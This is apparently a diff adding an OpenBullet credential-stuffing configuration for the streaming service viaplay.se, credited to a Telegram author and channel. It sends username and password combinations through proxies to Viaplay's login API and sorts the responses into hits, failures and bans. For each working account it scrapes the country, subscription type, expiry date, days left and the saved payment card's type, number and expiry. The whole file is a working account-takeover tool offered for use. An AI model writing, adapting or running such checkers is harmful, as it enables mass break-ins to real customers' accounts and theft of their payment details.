@@ -1,0 +1,136 @@
+[SETTINGS]
+{
+  "Name": "viaplay.se",
+  "SuggestedBots": 85,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-26T18:58:18.70906+03:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "RequiredPlugins": [],
+  "Author": "@Hogo_Victor",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 998025196
+    }
+  ],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#Login REQUEST POST "https://login.viaplay.se/api/login/v1?deviceKey=pcdash-se&returnurl=https%3A%2F%2Fcontent.viaplay.se%2Fpcdash-se&username=<US>&persistent=true" EncodeContent=TRUE 
+  CONTENT "password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Host: login.viaplay.se" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://viaplay.se/" 
+  HEADER "Origin: https://viaplay.se" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "AuthenticationError" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+
+#Country PARSE "<SOURCE>" LR "accountCountry\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#Get REQUEST GET "https://account.viaplay.no/" 
+  
+  HEADER "Host: account.viaplay.no" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://viaplay.no/" 
+
+#S PARSE "<SOURCE>" LR "<div id=\"subscription-section\" class=\"overview-widget" "=\"subscription-regular-info\" " -> VAR "S" 
+
+#Subscription PARSE "<S>" LR "class=\"widget-title\">" "</div>" CreateEmpty=FALSE -> CAP "Subscription" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Subscription>" Contains "Free" 
+    KEY "<SOURCE>" DoesNotContain "class=\"widget-title\">" 
+
+#EXP PARSE "<SOURCE>" LR "div class=\"subscription-next-billing-date\">" "</div>" -> VAR "EXP" 
+
+#Expire_Date PARSE "<EXP>" LR ": " "" CreateEmpty=FALSE -> CAP "Expire Date" 
+
+IF "<Expire Date>" Contains "."
+
+#U FUNCTION DateToUnixTime "dd.MM.yyyy" "<Expire Date>" -> VAR "U" 
+
+#C FUNCTION CurrentUnixTime -> VAR "C" 
+
+#Co FUNCTION Compute "(<U>-<C>)/86400" -> VAR "Co" 
+
+#Days_Left FUNCTION Round "<Co>" -> CAP "Days Left" 
+
+ELSE
+
+#U FUNCTION DateToUnixTime "yyyy-MM-dd" "<Expire Date>" -> VAR "U" 
+
+#C FUNCTION CurrentUnixTime -> VAR "C" 
+
+#Co FUNCTION Compute "(<U>-<C>)/86400" -> VAR "Co" 
+
+#Days_Left FUNCTION Round "<Co>" -> CAP "Days Left" 
+
+ENDIF
+IF "<SOURCE>" DoesNotContain "card-type"
+SET CAP "Card Detail" "No details"
+JUMP #Telegram_Channel
+ENDIF
+
+#N PARSE "<SOURCE>" LR "class=\"card-type " "\">" -> VAR "N" 
+
+#NUM PARSE "<SOURCE>" LR "credit-card-number\" class=\"card-type <N>\">" "</div>" -> VAR "NUM" 
+
+IF "<SOURCE>" Contains "Ditt betalkort slutade gälla "
+
+#E PARSE "<SOURCE>" LR "Ditt betalkort slutade gälla " ". Du behöver ändra" CreateEmpty=FALSE -> CAP "E" "Expired In " "" 
+
+#Card FUNCTION Constant "[<N>] [<NUM>] [<E>]" -> CAP "Card Detail" 
+
+ELSE
+
+#ED PARSE "<SOURCE>" LR "<div class=\"expire-date\">" "</div>" -> VAR "ED" 
+
+#Card_Detail FUNCTION Constant "[<N>] [<NUM>] [<ED>]" -> CAP "Card Detail" 
+
+ENDIF
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
